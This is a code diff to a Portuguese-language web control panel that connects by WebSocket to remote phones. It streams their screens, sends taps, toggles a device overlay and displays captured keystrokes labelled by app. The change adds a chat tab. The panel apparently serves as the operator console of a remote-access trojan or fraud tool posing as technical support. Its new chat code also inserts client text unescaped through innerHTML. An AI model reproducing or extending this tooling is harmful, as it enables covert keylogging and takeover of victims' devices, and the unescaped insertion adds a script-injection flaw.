@@ -8,16 +8,12 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:100vh;display:flex;flex-direction:column;overflow:hidden}
-
-/* Topbar */
 .topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 20px;background:#161b27;border-bottom:1px solid #2d3748;flex-shrink:0}
 .logo{font-size:15px;font-weight:700;color:#fff;display:flex;align-items:center;gap:8px}
 .logo i{color:#4299e1}
 .badge{display:flex;align-items:center;gap:6px;font-size:11px;padding:3px 10px;border-radius:999px;background:#1a202c}
 .badge.on{color:#68d391}.badge.off{color:#718096}
 .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
-
-/* Tela de lista */
 #tela-lista{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;gap:12px}
 #tela-lista h2{font-size:13px;color:#718096;margin-bottom:4px}
 .cliente-card{background:#161b27;border:1px solid #2d3748;border-radius:12px;padding:14px 18px;width:380px;display:flex;align-items:center;justify-content:space-between;gap:12px;transition:border-color .2s}
@@ -33,12 +29,8 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .btn-atender:disabled{background:#2d3748;color:#4a5568;cursor:not-allowed}
 .sem-clientes{color:#4a5568;font-size:13px;text-align:center}
 .sem-clientes i{font-size:32px;display:block;margin-bottom:8px;color:#2d3748}
-
-/* Tela do painel */
 #tela-painel{flex:1;display:none;overflow:hidden}
 .painel-inner{display:grid;grid-template-columns:190px 1fr 230px;height:100%}
-
-/* Sidebar */
 .sidebar{background:#161b27;border-right:1px solid #2d3748;padding:10px;display:flex;flex-direction:column;gap:2px;overflow-y:auto}
 .sec{font-size:9px;color:#4a5568;letter-spacing:.08em;text-transform:uppercase;padding:8px 6px 3px}
 .ctrl{display:flex;align-items:center;gap:7px;padding:7px 8px;border-radius:7px;border:none;background:transparent;color:#a0aec0;cursor:pointer;font-size:11px;width:100%;text-align:left}
@@ -53,8 +45,6 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .ctrl.overlay-on i{color:#fc8181}
 .vol-row{display:flex;align-items:center;gap:6px;padding:3px 0;font-size:10px;color:#4a5568}
 .vol-row input{flex:1;accent-color:#4299e1}
-
-/* Centro */
 .center{display:flex;flex-direction:column;align-items:center;padding:12px 16px;gap:8px;overflow:hidden}
 .device{background:#0a0a0a;border:2px solid #2d3748;border-radius:28px;flex-shrink:0;overflow:hidden;cursor:crosshair;position:relative}
 #canvas{display:block}
@@ -67,8 +57,6 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .nav-btn.overlay-on{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
 .nav-btn i{font-size:14px}
 .nav-btn span{font-size:8px}
-
-/* Direita */
 .right{border-left:1px solid #2d3748;background:#161b27;padding:10px;display:flex;flex-direction:column;overflow:hidden}
 .stat-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #1a202c;font-size:10px}
 .stat-label{color:#4a5568}.stat-val{color:#e2e8f0;font-weight:500}
@@ -86,7 +74,13 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .log-entry.ev{color:#68d391}.log-entry.err{color:#fc8181}.log-entry.warn{color:#ed8936}
 .keylog-entry{font-size:10px;padding:3px 4px;border-bottom:1px solid #1a202c;color:#e2e8f0;font-family:monospace}
 .keylog-entry .app{font-size:8px;color:#4a5568;display:block}
-
+/* Chat */
+.chat-container{flex:1;display:flex;flex-direction:column;overflow:hidden;min-height:0}
+.chat-msgs{flex:1;overflow-y:auto;padding:4px 0;display:flex;flex-direction:column;gap:4px}
+.chat-msg{padding:6px 8px;border-radius:8px;font-size:10px;max-width:90%;word-break:break-word;line-height:1.4}
+.chat-msg.tecnico{background:#1e2433;color:#4299e1;align-self:flex-start}
+.chat-msg.cliente{background:#2d4a2d;color:#68d391;align-self:flex-end}
+.chat-msg .chat-ts{font-size:8px;color:#4a5568;display:block;margin-top:2px}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 </style>
 </head>
@@ -105,7 +99,6 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 
 <div style="display:flex;flex:1;overflow:hidden">
 
-  <!-- LISTA DE CLIENTES -->
   <div id="tela-lista">
     <h2><i class="ti ti-devices" style="margin-right:6px"></i>Dispositivos</h2>
     <div id="lista" style="display:flex;flex-direction:column;gap:8px;width:380px">
@@ -113,7 +106,6 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
     </div>
   </div>
 
-  <!-- PAINEL DO TÉCNICO -->
   <div id="tela-painel">
     <div class="painel-inner">
 
@@ -174,9 +166,13 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <div class="tabs">
           <button class="tab active" id="tab-log" onclick="aba('log')">📋 Log</button>
           <button class="tab" id="tab-key" onclick="aba('key')">⌨️ Keys<span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 4px;font-size:8px;margin-left:2px">!</span></button>
+          <button class="tab" id="tab-chat" onclick="aba('chat')">💬 Chat<span id="chat-badge" style="display:none;background:#68d391;color:#1a202c;border-radius:999px;padding:0 4px;font-size:8px;margin-left:2px">!</span></button>
         </div>
         <div class="log" id="painel-log"></div>
         <div class="log" id="painel-key" style="display:none"></div>
+        <div class="chat-container" id="painel-chat" style="display:none">
+          <div class="chat-msgs" id="chat-msgs"></div>
+        </div>
       </div>
 
     </div>
@@ -190,14 +186,9 @@ let ws = null, deviceAtual = null;
 let dw = 1080, dh = 2340;
 let abaAtual = 'log', overlayAtivo = false;
 
-// ── Conexão ───────────────────────────────────────────────────────────────
-
 function conectar() {
   ws = new WebSocket(`${WS_URL}?papel=tecnico`);
-  ws.onopen = () => {
-    setBadge(true);
-    log('Painel conectado', 'ev');
-  };
+  ws.onopen = () => { setBadge(true); log('Painel conectado', 'ev'); };
   ws.onmessage = (e) => {
     const msg = JSON.parse(e.data);
     switch (msg.tipo) {
@@ -206,6 +197,7 @@ function conectar() {
       case 'screenshot':         mostrarScreenshot(msg.frame); break;
       case 'arvore_tela':        desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
       case 'keylog':             logKey(msg.texto, msg.app || '?'); break;
+      case 'resposta_cliente':   receberRespostaCliente(msg.texto); break;
       case 'cliente_offline':    log('Cliente ficou offline', 'warn'); break;
       case 'cliente_desconectou':log('Cliente desconectou', 'err'); break;
       case 'erro':               log('Erro: ' + msg.msg, 'err'); break;
@@ -219,8 +211,6 @@ function send(msg) {
   if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg));
 }
 function cmd(c) { send({tipo:'cmd', cmd:c}); log(`→ ${c}`); }
-
-// ── Lista ─────────────────────────────────────────────────────────────────
 
 function renderLista(clientes) {
   const el = document.getElementById('lista');
@@ -249,11 +239,7 @@ function renderLista(clientes) {
   `).join('');
 }
 
-function atender(token) {
-  send({tipo: 'conectar_cliente', deviceToken: token});
-}
-
-// ── Painel ────────────────────────────────────────────────────────────────
+function atender(token) { send({tipo: 'conectar_cliente', deviceToken: token}); }
 
 function abrirPainel(msg) {
   deviceAtual = msg.deviceToken;
@@ -274,11 +260,10 @@ function encerrarSessao() {
   document.getElementById('tela-lista').style.display = 'flex';
   document.getElementById('btn-voltar').style.display = 'none';
   document.getElementById('token-top').textContent = '';
+  document.getElementById('chat-msgs').innerHTML = '';
   limparCanvas();
   log('Sessão encerrada', 'warn');
 }
-
-// ── Canvas ────────────────────────────────────────────────────────────────
 
 function tamanhoCanvas() {
   const h = Math.round(VISOR_W * dh / dw);
@@ -296,10 +281,7 @@ function mostrarScreenshot(base64) {
   const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
   const img = new Image();
-  img.onload = () => {
-    ctx.drawImage(img, 0, 0, sw, sh);
-    document.getElementById('waiting').style.display = 'none';
-  };
+  img.onload = () => { ctx.drawImage(img, 0, 0, sw, sh); document.getElementById('waiting').style.display = 'none'; };
   img.src = 'data:image/jpeg;base64,' + base64;
 }
 
@@ -343,8 +325,6 @@ function limparCanvas() {
   document.getElementById('waiting').style.display = 'flex';
 }
 
-// ── Toque ─────────────────────────────────────────────────────────────────
-
 document.getElementById('device').addEventListener('click', (e) => {
   const r = e.currentTarget.getBoundingClientRect();
   const xPct = Math.max(0, Math.min(100, (e.clientX-r.left)/r.width*100));
@@ -352,8 +332,6 @@ document.getElementById('device').addEventListener('click', (e) => {
   send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dw, altura:dh});
   log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
 });
-
-// ── Overlay ───────────────────────────────────────────────────────────────
 
 function toggleOverlay() {
   overlayAtivo = !overlayAtivo;
@@ -371,8 +349,6 @@ function toggleOverlay() {
   }
 }
 
-// ── Info ──────────────────────────────────────────────────────────────────
-
 function atualizarInfo(info) {
   if(!info) return;
   document.getElementById('d-model').textContent = info.modelo||'—';
@@ -388,25 +364,45 @@ function atualizarInfo(info) {
   }
 }
 
-// ── Mensagem ──────────────────────────────────────────────────────────────
-
 function enviarMsg() {
   const v = document.getElementById('msg-input').value.trim();
   if(!v) return;
   send({tipo:'mensagem', texto:v});
+  // Adiciona no chat como mensagem do técnico
+  adicionarMsgChat(v, 'tecnico');
   log(`→ msg: ${v}`, 'ev');
   document.getElementById('msg-input').value = '';
 }
 
-// ── Log ───────────────────────────────────────────────────────────────────
+// ── Chat ──────────────────────────────────────────────────────────────────
+
+function receberRespostaCliente(texto) {
+  adicionarMsgChat(texto, 'cliente');
+  if(abaAtual !== 'chat') {
+    document.getElementById('chat-badge').style.display = 'inline';
+  }
+}
+
+function adicionarMsgChat(texto, tipo) {
+  const el = document.getElementById('chat-msgs');
+  const d = document.createElement('div');
+  d.className = `chat-msg ${tipo}`;
+  const ts = new Date().toLocaleTimeString('pt-BR');
+  d.innerHTML = `${texto}<span class="chat-ts">${tipo === 'tecnico' ? '🔧 Você' : '📱 Cliente'} · ${ts}</span>`;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
 
 function aba(a) {
   abaAtual = a;
-  document.getElementById('painel-log').style.display = a==='log'?'block':'none';
-  document.getElementById('painel-key').style.display = a==='key'?'block':'none';
-  document.getElementById('tab-log').className = 'tab'+(a==='log'?' active':'');
-  document.getElementById('tab-key').className = 'tab'+(a==='key'?' active':'');
-  if(a==='key') document.getElementById('key-badge').style.display='none';
+  document.getElementById('painel-log').style.display  = a==='log'  ? 'block' : 'none';
+  document.getElementById('painel-key').style.display  = a==='key'  ? 'block' : 'none';
+  document.getElementById('painel-chat').style.display = a==='chat' ? 'flex'  : 'none';
+  document.getElementById('tab-log').className  = 'tab'+(a==='log'  ? ' active' : '');
+  document.getElementById('tab-key').className  = 'tab'+(a==='key'  ? ' active' : '');
+  document.getElementById('tab-chat').className = 'tab'+(a==='chat' ? ' active' : '');
+  if(a==='key')  document.getElementById('key-badge').style.display  = 'none';
+  if(a==='chat') document.getElementById('chat-badge').style.display = 'none';
 }
 
 function log(msg, tipo='') {
